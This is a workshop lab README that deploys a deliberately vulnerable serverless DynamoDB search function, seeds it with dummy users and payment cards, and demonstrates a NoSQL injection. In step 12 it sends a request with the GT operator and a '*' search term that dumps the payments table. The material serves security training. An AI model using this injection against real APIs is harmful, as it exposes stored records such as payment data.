# DynamoDB Injection

This attack/payload has been documented [here](https://medium.com/appsecengineer/dynamodb-injection-1db99c2454ac) article.

On reading, you'll see that its a NoSQL Injection attack that's predicated on using the `gt` operator. One of the main reasons that this attack is made possible, is because of badly configured IAM privileges

**Note:** If you have not setup your aws cli follow [AWS-CLI-Configuration](aws-configure/README.md) under the `Setup` section*


* Step 1: In your image, navigate over to `/root/labs/Serverless-Workshop/`

```commandline
cd /root/labs/Serverless-Workshop/
```

* Step 2: Run `pip3 install pipenv`

```commandline
pip3 install pipenv
```

* Step 3: `pipenv shell`

```commandline
pipenv shell
``` 

```commandline
pipenv install boto3
``` 

```commandline
pipenv install faker
``` 

```commandline
pipenv install huepy
``` 

* Step 4: In your image, navigate over to `/root/labs/Serverless-Workshop/DynamoDB-Injection`

```commandline
cd /root/labs/Serverless-Workshop/DynamoDB-Injection
```

* Step 5: Run `sls plugin install -n serverless-python-requirements`

```commandline
sls plugin install -n serverless-python-requirements
```

* Wait for instructor to explain the contents of the lab

* Step 6: Let's look at the contents of the `serverless.yml` [here](https://github.com/we45/Serverless-Workshop/blob/master/DynamoDB-Injection/serverless.yml)

* Step 7: Deploy the function with the command `sls deploy`

```commandline
sls deploy
```

* Wait for the function to deploy completely 


* Step 8: In your image, navigate over to `/root/labs/Serverless-Workshop/DynamoDB-Injection/ops`

```commandline
cd /root/labs/Serverless-Workshop/DynamoDB-Injection/ops
```

* Step 9: Create dummy users `python create_dummies.py users we45-sls-users`

```commandline
python create_dummies.py users we45-sls-users
```

* Step 10: Create dummy payment cards `python create_dummies.py cards we45-sls-payments`

```commandline
python create_dummies.py cards we45-sls-payments
```


* Step 11: Let's now run a genuine search against the database with this command

```commandline

http POST <https://xxxx.execute-api.us-east-1.amazonaws.com/dev/dynamo-search> db=we45-sls-users search_term=Mark search_operator=EQ search_field=first_name

```

* Replace the `URL` from **Step 7**

* Step 12: Now let's run the exploit

```commandline

http POST <https://xxxx.execute-api.us-east-1.amazonaws.com/dev/dynamo-search> db=we45-sls-payments search_term="*" search_operator=GT search_field=payment-card

```

* Replace the `URL` from **Step 7**

### Teardown

* Step 13: In your image, navigate over to `/root/labs/Serverless-Workshop/DynamoDB-Injection`

```commandline
cd /root/labs/Serverless-Workshop/DynamoDB-Injection
```

* Step 14: Run `sls remove` to remove stack

```commandline
sls remove --force
```

* Step 15: In your image, navigate over to `/root/labs/Serverless-Workshop/`

```commandline
cd /root/labs/Serverless-Workshop/
```

* Step 16: Deactivate `pipenv` using `deactivate` command

```commandline
deactivate
```

```commandline
exit
```
